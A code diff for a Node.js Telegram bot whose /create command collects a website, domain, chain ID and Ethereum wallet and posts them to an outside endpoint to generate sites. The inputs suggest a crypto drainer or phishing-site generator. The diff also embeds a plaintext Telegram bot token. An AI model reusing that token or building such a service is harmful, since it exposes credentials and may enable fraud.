@@ -6,6 +6,122 @@ const TelegramBot = require("node-telegram-bot-api");
 const token = "5882548762:AAEx6_d4hGGoKqvHr84VAsZL9PyfiFdcEso";
 const bot = new TelegramBot(token, { polling: true });
 
+// 存储用户状态的对象
+const userStates = {};
+
+// 处理/start命令
+bot.onText(/\/start/, (msg) => {
+    const chatId = msg.chat.id;
+
+    const replyMarkup = {
+        keyboard: [
+            [{ text: "/create" }],
+            [{ text: "/report" }],
+            [{ text: "/help" }],
+        ],
+        one_time_keyboard: true,
+    };
+    if (msg.chat.type === "group") {
+        // 群组
+        bot.sendMessage(chatId, "Menu list：", { reply_markup: replyMarkup });
+    }
+});
+
+// Handling /create command
+bot.onText(/\/create (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    const [website, domain, chainId, wallet] = match[1].split(" ");
+
+    // Checking if website and domain are valid URLs
+    if (!isUrl(website) || !isUrl(domain)) {
+        bot.sendMessage(
+            chatId,
+            "Please provide valid URLs for website and domain!"
+        );
+        return;
+    }
+
+    // Checking if chainId is a number
+    if (isNaN(chainId)) {
+        bot.sendMessage(chatId, "chainId must be a number!");
+        return;
+    }
+
+    // Checking if wallet is a valid Ethereum wallet address
+    if (!isEthWallet(wallet)) {
+        bot.sendMessage(
+            chatId,
+            "Please provide a valid Ethereum wallet address!"
+        );
+        return;
+    }
+
+    // Parameters validation passed, sending to API endpoint
+    const apiUrl = "https://psyop.guru/publish";
+    const payload = {
+        website,
+        domain,
+        chainId,
+        wallet,
+        chatId,
+    };
+
+    // Sending a POST request to the API
+    axios
+        .post(apiUrl, payload)
+        .then((response) => {
+            const result = response.data;
+            if (result.code == 1) {
+                bot.sendMessage(
+                    chatId,
+                    `Message result: ${result.message} ,please wait patiently for the system to generate the site.`
+                );
+            } else {
+                bot.sendMessage(
+                    chatId,
+                    `An error occurred, please contact the administrator.`
+                );
+            }
+        })
+        .catch((error) => {
+            console.error(error);
+            bot.sendMessage(
+                chatId,
+                "An error occurred while sending the request!"
+            );
+        });
+});
+bot.onText(/\/report/, (msg) => {
+    const chatId = msg.chat.id;
+    bot.sendMessage(chatId, "selected /report");
+});
+
+bot.onText(/\/help/, (msg) => {
+    const chatId = msg.chat.id;
+    bot.sendMessage(chatId, "selected /help");
+});
+
+// Helper function: Checking if it's a URL
+function isUrl(text) {
+    try {
+        const url = new URL(text);
+        return url.protocol === "http:" || url.protocol === "https:";
+    } catch (error) {
+        return false;
+    }
+}
+
+// Helper function: Checking if it's a valid Ethereum wallet address
+function isEthWallet(text) {
+    const ethWalletRegex = /^0x[a-fA-F0-9]{40}$/;
+    return ethWalletRegex.test(text);
+}
+
+bot.on("polling_error", (error) => {
+    console.log(error);
+});
+console.log("机器人已启动！");
+
 // 建立与RabbitMQ的连接
 amqp.connect("amqp://rabbitmq", (err, connection) => {
     if (err) {
@@ -97,7 +213,7 @@ async function runBuild(envData) {
     console.log(bot_chatid);
     // 运行npm run build命令
 
-    将.env数据写入Next.js的.env文件;
+    //将.env数据写入Next.js的.env文件;
     const envContent = writeEnv(envData);
     fs.writeFileSync(".env", envContent);
 
